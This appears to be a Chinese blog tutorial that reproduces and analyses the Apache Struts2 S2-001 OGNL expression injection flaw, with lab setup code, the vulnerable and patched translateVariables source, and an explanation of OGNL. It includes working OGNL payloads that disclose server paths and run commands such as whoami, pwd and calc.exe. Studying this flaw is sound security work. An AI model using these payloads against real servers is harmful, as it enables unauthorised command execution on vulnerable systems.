> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/dRbxB_AJODc-ojEdueu_8Q)

![](https://mmbiz.qpic.cn/mmbiz_png/TnnmypeImicyIbtk4miaeK9VsIfndhG8rZeTnDiac6ufm8gQnicxTOdfVN17sK9SzLtSx52ia0Ukr3Pl4BXwtTW3tYQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/3apibeqXIibtlRSmdBjDMSx9FCL7fjGMzIVib4dibPCBw2JmACuznE2OokaNzdAXccENNNqt7GBEB4fRYQoibpME6EQ/640?wx_fmt=png)

点击上方 蓝字 关注我们

  

  

  

  

前言

开始好好学 Java，跟着师傅们的文章走一遍

  

  

  

  

Struts 简介

Struts2 是流行和成熟的基于 MVC 设计模式的 Web 应用程序框架。Struts2 不只是 Struts1 下一个版本，它是一个完全重写的 Struts 架构。

**工作流程：**

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibcy5a7mPgEnb8lib3dcs5v5JUicRsDHgjSkjgrsib0y0jdLIXrOLYZrPquEUJZ1p5R6ZkCH8ic7pt1qQ/640?wx_fmt=png)

  

  

  

  

漏洞复现

**漏洞简介**

**漏洞详情：**

https://cwiki.apache.org/confluence/display/WW/S2-001

由于 OGNL 表达式的递归执行，造成了命令执行

**环境搭建**

mac 下直接 brew install tomcat

catalina run 启动 tomcat

brew services start tomcat 后台启动服务

Apache Tomcat/8.5.53

IntelliJ IDEA

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibcy5a7mPgEnb8lib3dcs5v528eSotcGJ2ojJI7urQ7oqyKMnM4xJ0l7oDujeaibkSF1BJMh7kjCqicg/640?wx_fmt=png)

建好后从

http://archive.apache.org/dist/struts/binaries/struts-2.0.1-all.zip 中下载 struts2 的 jar 包

项目所需文件都放在

https://github.com/twosmi1e/S2-001

导入项目所需的包 File->Project Structure

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibcy5a7mPgEnb8lib3dcs5v5SSzIgtMe7mxIxZgmiccUvGOJyzm7qBzQEj4iceiaJ0AxicXS8XiadAIgnibA/640?wx_fmt=png)

然后搭建环境，项目结构如图

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibcy5a7mPgEnb8lib3dcs5v5nKxpylu4fS48cw1AlY3sicibicYMGIL5fEryLVJDCicGYXq48RTP1nD8oQ/640?wx_fmt=png)

src 下新建 struts.xml

```
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE struts PUBLIC
"-//Apache Software Foundation//DTD Struts Configuration 2.0//EN"
"http://struts.apache.org/dtds/struts-2.0.dtd">
<struts>
<package >
<action >
<result >welcome.jsp</result>
<result >index.jsp</result>
</action>
</package>
</struts>
```

修改 web.xml

```
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns="http://xmlns.jcp.org/xml/ns/javaee" xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd" id="WebApp_ID" version="3.1">
<display-name>S2-001 Example</display-name>
<filter>
<filter-name>struts2</filter-name>
<filter-class>org.apache.struts2.dispatcher.FilterDispatcher</filter-class>
</filter>
<filter-mapping>
<filter-name>struts2</filter-name>
<url-pattern>/*</url-pattern>
</filter-mapping>
<welcome-file-list>
<welcome-file>index.jsp</welcome-file>
</welcome-file-list>
</web-app>
```

index.jsp

```
<%--
Created by IntelliJ IDEA.
User: twosmi1e
Date: 2020/11/19
Time: 2:25 下午
To change this template use File | Settings | File Templates.
--%>
<%@ page language="java" contentType="text/html; charset=UTF-8"
pageEncoding="UTF-8"%>
<%@ taglib prefix="s" uri="/struts-tags" %>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>S2-001</title>
</head>
<body>
<h2>S2-001 Demo</h2>
<p>link: <a href="https://cwiki.apache.org/confluence/display/WW/S2-001">https://cwiki.apache.org/confluence/display/WW/S2-001</a></p>
<s:form action="login">
<s:textfield  />
<s:textfield  />
<s:submit></s:submit>
</s:form>
</body>
</html>
```

welcome.jsp

```
<%--
Created by IntelliJ IDEA.
User: twosmi1e
Date: 2020/11/19
Time: 3:09 下午
To change this template use File | Settings | File Templates.
--%>
<%@ page language="java" contentType="text/html; charset=UTF-8"
pageEncoding="UTF-8"%>
<%@ taglib prefix="s" uri="/struts-tags" %>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>S2-001</title>
</head>
<body>
<p>Hello <s:property value="username"></s:property></p>
</body>
</html>
```

在 src 下新建名为 com.demo.action 的 package

LoginAction.java

```
package com.demo.action;


import com.opensymphony.xwork2.ActionSupport;


public class LoginAction extends ActionSupport {
private String username = null;
private String password = null;


public String getUsername() {
return this.username;
}


public String getPassword() {
return this.password;
}


public void setUsername(String username) {
this.username = username;
}


public void setPassword(String password) {
this.password = password;
}


public String execute() throws Exception {
if ((this.username.isEmpty()) || (this.password.isEmpty())) {
return "error";
}
if ((this.username.equalsIgnoreCase("admin"))
&& (this.password.equals("admin"))) {
return "success";
}
return "error";
}
}
```

然后点击 Build->Build Project 配置好 tomcat，homebrew 安装的 tomcat home:/usr/local/Cellar/tomcat/9.0.33/libexecrun 起来会看到如下画面

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibcy5a7mPgEnb8lib3dcs5v52jzicn5DfZwdAzv2coVC9gicictz4VNlxPoibOlB0Pv86OBdsHsl5KErmQ/640?wx_fmt=png)

  

  

  

  

漏洞利用

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibcy5a7mPgEnb8lib3dcs5v5U2FRzahUPQhTicCvfTHpChzl3AS7QlDOz19nalYFgicBIPTX0oLIB6Xg/640?wx_fmt=png)

点击 submit 后 ognl 表达式会解析执行 返回 2

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibcy5a7mPgEnb8lib3dcs5v5j7reaUn0DUM1r2STP73xterGSfymmPH1E3730l7zu8qnXVclnzyG8Q/640?wx_fmt=png)

获取 tomcat 路径

```
%{"tomcatBinDir{"+@java.lang.System@getProperty("user.dir")+"}"}
```

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibcy5a7mPgEnb8lib3dcs5v56iafcg03hPGaDa66Qrk39iajoTUzfWdUlstVt2AV80nuPZnzh65G0Fiag/640?wx_fmt=png)

获取 web 路径

```
%{#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#response.println(#req.getRealPath('/')),#response.flush(),#response.close()}
```

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibcy5a7mPgEnb8lib3dcs5v5b48NziaYrzEIapvWVp053FEtdwiaZ0pHp8fMG5sqiauicMxs87DylD1gzg/640?wx_fmt=png)

命令执行

```
%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"whoami"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
```

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibcy5a7mPgEnb8lib3dcs5v57z1NZQvxQiaJPYtmma1ZzLtHw0yKnUajbadR57g5vg6qkVSRRTToYBA/640?wx_fmt=png)

```
%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"pwd"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
```

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibcy5a7mPgEnb8lib3dcs5v54tIfqLufeGnTvs1tKcyHNdiaiaYTkP0hSKJBM5oG0yc0YxicDIv51cglg/640?wx_fmt=png)

  

  

  

  

OGNL 表达式

OGNL 是 Object Graphic Navigation Language(对象图导航语言) 的缩写，它是一种功能强大的表达式语言，使用它可以存取对象的任意属性，调用对象的方法，使用 OGNL 表达式的主要作用是简化访问对象中的属性值，Struts 2 的标签中使用的就是 OGNL 表达式。

**OGNL 三要素**

  

  

  

  

1.  表达式（expression）：表达式是整个 OGNL 的核心，通过表达式来告诉 OGNL 需要执行什么操作；
    
2.  根对象（root）：root 可以理解为 OGNL 的操作对象，OGNL 可以对 root 进行取值或写值等操作，表达式规定了 “做什么”，而根对象则规定了 “对谁操作”。实际上根对象所在的环境就是 OGNL 的上下文对象环境；
    
3.  上下文对象（context）：context 可以理解为对象运行的上下文环境，context 以 MAP 的结构、利用键值对关系来描述对象中的属性以及值；
    

**表达式功能操作清单**

![](https://mmbiz.qpic.cn/mmbiz_png/PnibxIS3GjyWSgsMVTsfqKLKc2tvxBickhWB4icnZPgDZpqm6bWnT6XFAyjWnibbozNW2Loc6EZw5D1SlgxFJDKicVQ/640?wx_fmt=png)

01

基本对象树的访问

对象树的访问就是通过使用点号将对象的引用串联起来进行。

例如：xxxx，xxxx.xxxx，xxxx. xxxx. xxxx. xxxx. xxxx

![](https://mmbiz.qpic.cn/mmbiz_png/Yygpic0Yd5yK42GVSZhR46REryCXRhDKv8IeOAokpiaKfKPP9LUibiaNzRKkMsTJ7KkemkkN6ianXpdxD57s3icsHmHA/640?wx_fmt=png)

02

对容器变量的访问

对容器变量的访问，通过 #符号加上表达式进行。  
例如：#xxxx，#xxxx. xxxx，#xxxx.xxxxx. xxxx. xxxx. xxxx

![](https://mmbiz.qpic.cn/mmbiz_png/LjNrwIZkE8V5M27HoXCgRjXf8tedvQcsahD3ajoibbWibdOfxlglkjMdfZ6zPnCo6PwIIIMFqZYhfq6Bt0ytPPwg/640?wx_fmt=png)

03

使用操作符号

OGNL 表达式中能使用的操作符基本跟 Java 里的操作符一样，除了能使用 +, -, *, /, ++, --, ==, !=, = 等操作符之外，还能使用 mod, in, not in 等。

![](https://mmbiz.qpic.cn/mmbiz_png/PnibxIS3GjyWSgsMVTsfqKLKc2tvxBickhWB4icnZPgDZpqm6bWnT6XFAyjWnibbozNW2Loc6EZw5D1SlgxFJDKicVQ/640?wx_fmt=png)

04

容器、数组、对象

OGNL 支持对数组和 ArrayList 等容器的顺序访问：

例如：group.users[0]

  
同时，OGNL 支持对 Map 的按键值查找：  
例如：

#session['mySessionPropKey']

  
不仅如此，OGNL 还支持容器的构造的表达式：  
例如：{"green", "red", "blue"} 构造一个 List，#{"key1" : "value1", "key2" : "value2", "key3" : "value3"} 构造一个 Map

  
你也可以通过任意类对象的构造函数进行对象新建  
例如：

new Java.net.URL("xxxxxx/")

![](https://mmbiz.qpic.cn/mmbiz_png/Yygpic0Yd5yK42GVSZhR46REryCXRhDKv8IeOAokpiaKfKPP9LUibiaNzRKkMsTJ7KkemkkN6ianXpdxD57s3icsHmHA/640?wx_fmt=png)

05

对静态方法或变量的访问

要引用类的静态方法和字段，他们的表达方式是一样的

@class@member

或者

@class@method(args):

![](https://mmbiz.qpic.cn/mmbiz_png/LjNrwIZkE8V5M27HoXCgRjXf8tedvQcsahD3ajoibbWibdOfxlglkjMdfZ6zPnCo6PwIIIMFqZYhfq6Bt0ytPPwg/640?wx_fmt=png)

06

方法调用

直接通过类似 Java 的方法调用方式进行，你甚至可以传递参数：

例如：

user.getName(),group.users.size(),group.containsUser(#requestUser)

![](https://mmbiz.qpic.cn/mmbiz_png/PnibxIS3GjyWSgsMVTsfqKLKc2tvxBickhWB4icnZPgDZpqm6bWnT6XFAyjWnibbozNW2Loc6EZw5D1SlgxFJDKicVQ/640?wx_fmt=png)

07

投影和选择

OGNL 支持类似数据库中的投影（projection） 和选择（selection）。

投影就是选出集合中每个元素的相同属性组成新的集合，类似于关系数据库的字段操作。

投影操作语法为 collection.{XXX}，其中 XXX 是这个集合中每个元素的公共属性。

例如：

group.userList.{username} 将获得某个 group 中的所有 user 的 name 的列表。

选择就是过滤满足 selection 条件的集合元素，类似于关系数据库的纪录操作。

选择操作的语法为：

collection.{X YYY}，其中 X 是一个选择操作符，后面则是选择用的逻辑表达式。

而选择操作符有三种：

? 选择满足条件的所有元素

^ 选择满足条件的第一个元素

$ 选择满足条件的最后一个元素

例如：

group.userList.{? #txxx.xxx != null} 将获得某个 group 中 user 的 name 不为空的 user 的列表。

表达式注入总结 By mi1k7ea.

更详细的介绍：

https://www.cnblogs.com/renchunxiao/p/3423299.html

  

  

  

  

漏洞分析

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibcy5a7mPgEnb8lib3dcs5v5JUicRsDHgjSkjgrsib0y0jdLIXrOLYZrPquEUJZ1p5R6ZkCH8ic7pt1qQ/640?wx_fmt=png)

由上图工作流程我们可以看到，当一个 HTTP 请求被 Struts2 处理时，会经过一系列的 拦截器 (Interceptor) ，这些拦截器可以是 Struts2 自带的，也可以是用户自定义的。例如下图 struts.xml 中的 package 继承自 struts-default ，而 struts-default 就使用了 Struts2 自带的拦截器。

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibcy5a7mPgEnb8lib3dcs5v51UXy4KXTlZibibvCJ2J6V7eJY3frkkb6YH42pgcPVtDpLbITs3sCRRcg/640?wx_fmt=png)

找到默认使用的拦截器栈

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibcy5a7mPgEnb8lib3dcs5v5cJTxwnndgmXsI3HgaxhUuHnBPeOInISyicHDJrK2BpXboEC8ujNGeLQ/640?wx_fmt=png)

在拦截器栈 defaultStack 中，我们需要关注 params 这个拦截器。其中， params 拦截器 会将客户端请求数据设置到 值栈 (valueStack) 中，后续 JSP 页面中所有的动态数据都将从值栈中取出。

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibcy5a7mPgEnb8lib3dcs5v5676Rl38pb9R3HsXiaLw5UJkT3u53Olum4Nn9nf6u6nU9joUoibvXfEwA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibcy5a7mPgEnb8lib3dcs5v5uvd2ZtvpH056rrgFav6wnI3fEoPWtXxKP67ibialJicA4dMR9pZtTLhXw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibcy5a7mPgEnb8lib3dcs5v5icnqBcg6iboxXA7Qa6wrxCzJFz0ysRBXDRXr2tGQu0pntBJriasYsuutg/640?wx_fmt=png)

在经过一系列的拦截器处理后，数据会成功进入实际业务 Action 。程序会根据 Action 处理的结果，选择对应的 JSP 视图进行展示，并对视图中的 Struts2 标签进行处理。如下图，在本例中 Action 处理用户登录失败时会返回 error 。

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibcy5a7mPgEnb8lib3dcs5v5BXqKeEgOqoxicDlZhqL42kENqxK8MveZfwVArnvNiaZpmeheYcdncSnw/640?wx_fmt=png)

然后

/com/opensymphony/xwork2/DefaultActionInvocation.class:253

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibcy5a7mPgEnb8lib3dcs5v5JJI6x1icmnGWseqgzQFibRPMIurFiaCN8YVbEic6RnUhMDwn2T3lwagOpQ/640?wx_fmt=png)

继续往下，主要问题在 translateVariables 这个函数里

```
/**
* Converted object from variable translation.
*
* @param open
* @param expression
* @param stack
* @param asType
* @param evaluator
* @return Converted object from variable translation.
*/
public static Object translateVariables(char open, String expression, ValueStack stack, Class asType, ParsedValueEvaluator evaluator) {
// deal with the "pure" expressions first!
//expression = expression.trim();
Object result = expression;


while (true) {
int start = expression.indexOf(open + "{");
int length = expression.length();
int x = start + 2;
int end;
char c;
int count = 1;
while (start != -1 && x < length && count != 0) {
c = expression.charAt(x++);
if (c == '{') {
count++;
} else if (c == '}') {
count--;
}
}
end = x - 1;


if ((start != -1) && (end != -1) && (count == 0)) {
String var = expression.substring(start + 2, end);


Object o = stack.findValue(var, asType);
if (evaluator != null) {
o = evaluator.evaluate(o);
}




String left = expression.substring(0, start);
String right = expression.substring(end + 1);
if (o != null) {
if (TextUtils.stringSet(left)) {
result = left + o;
} else {
result = o;
}


if (TextUtils.stringSet(right)) {
result = result + right;
}


expression = left + o + right;
} else {
// the variable doesn't exist, so don't display anything
result = left + right;
expression = left + right;
}
} else {
break;
}
}


return XWorkConverter.getInstance().convertValue(stack.getContext(), result, asType);
}
```

第一次执行的时候 会取出 %{username} 的值，即 %{1+1}

通过 if ((start != -1) && (end != -1) && (count == 0)) 的判断，跳过 return

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibcy5a7mPgEnb8lib3dcs5v5U4KaVab6eib0WOGdy20dC2vy6RN48TXB4aQmyaMvyd7MjfRLG3ibKhHg/640?wx_fmt=png)

通过 Object o = stack.findValue(var, asType); 把值赋给 o

然后赋值给 expression，进行下一次循环

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibcy5a7mPgEnb8lib3dcs5v5icOR369rVDsWK8bZWdyJ0eeGVVRZpvSbYa3uge8SV8qNqwz5n78Yepw/640?wx_fmt=png)

第二次循环会执行我们构造的 OGNL 表达式

可以看到执行后结果为 2

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibcy5a7mPgEnb8lib3dcs5v59MBdCr0boeqZkcxmA40ZziapIEb55WpfvwSrjup6T94e85RmfkjrLAg/640?wx_fmt=png)

然后再次循环，经过 if 判断过后 return

后面经过处理后返回 index.jsp

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibcy5a7mPgEnb8lib3dcs5v50oMaEzeMmBolL2Go4icYXLA5w8mWXFuu0ch7ncRLhFCmqdUm5P4TXQA/640?wx_fmt=png)

漏洞成因呢就是在 translateVariables 函数中递归来验证 OGNL 表达式，造成了 OGNL 表达式的执行

  

  

  

  

漏洞修复

官方修复代码

```
public static Object translateVariables(char open, String expression, ValueStack stack, Class asType, ParsedValueEvaluator evaluator, int maxLoopCount) {
// deal with the "pure" expressions first!
//expression = expression.trim();
Object result = expression;
int loopCount = 1;
int pos = 0;
while (true) {


int start = expression.indexOf(open + "{", pos);
if (start == -1) {
pos = 0;
loopCount++;
start = expression.indexOf(open + "{");
}
if (loopCount > maxLoopCount) {
// translateVariables prevent infinite loop / expression recursive evaluation
break;
}
int length = expression.length();
int x = start + 2;
int end;
char c;
int count = 1;
while (start != -1 && x < length && count != 0) {
c = expression.charAt(x++);
if (c == '{') {
count++;
} else if (c == '}') {
count--;
}
}
end = x - 1;


if ((start != -1) && (end != -1) && (count == 0)) {
String var = expression.substring(start + 2, end);


Object o = stack.findValue(var, asType);
if (evaluator != null) {
o = evaluator.evaluate(o);
}




String left = expression.substring(0, start);
String right = expression.substring(end + 1);
String middle = null;
if (o != null) {
middle = o.toString();
if (!TextUtils.stringSet(left)) {
result = o;
} else {
result = left + middle;
}


if (TextUtils.stringSet(right)) {
result = result + right;
}


expression = left + middle + right;
} else {
// the variable doesn't exist, so don't display anything
result = left + right;
expression = left + right;
}
pos = (left != null && left.length() > 0 ? left.length() - 1: 0) +
(middle != null && middle.length() > 0 ? middle.length() - 1: 0) +
1;
pos = Math.max(pos, 1);
} else {
break;
}
}


return XWorkConverter.getInstance().convertValue(stack.getContext(), result, asType);
}
```

可以看到增加了对 OGNL 递归解析次数的判断，默认情况下只会解析第一层

```
if (loopCount > maxLoopCount) {
// translateVariables prevent infinite loop / expression recursive evaluation
break;
}
```

  

  

  

  

总结

入门找了 S2-001 跟着师傅们的文章学习了一下，原理还是很简单，就是调试 java 过程很费时间。

最后弹个计算器收尾吧，（不知道为什么 mac 上

弹 / System/Application/Calculator.app 没弹成功

```
%{(new java.lang.ProcessBuilder(new java.lang.String[]{"calc.exe"})).start()}
```

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibcy5a7mPgEnb8lib3dcs5v5OLOpf4kZM36JnWSsic7E6icpbAgynyQSKiaDV6kNP6w6hXM4UydxpNCEg/640?wx_fmt=png)

**参考**

https://mochazz.github.io/2020/06/16/Java 代码审计之 Struts2-001/# 漏洞分析

https://xz.aliyun.com/t/2672

https://xz.aliyun.com/t/2044

end

  

![](https://mmbiz.qpic.cn/mmbiz_png/RXib24CCXQ0ibcy5a7mPgEnb8lib3dcs5v59n52sbL5BhfbgaITTuC4mrEAhuMU8ic8cwibnQL2HiaPYorLEeVxUWoXg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/DRPGpicFk5BvqeFQm89dvWAVHcIysmqlcxfoVMHUEpOOGNEyXRJGSnxbpBTOiayAPiapCyibpPzY6pKCpAM3yINDLg/640?wx_fmt=png)

点个在看你最好看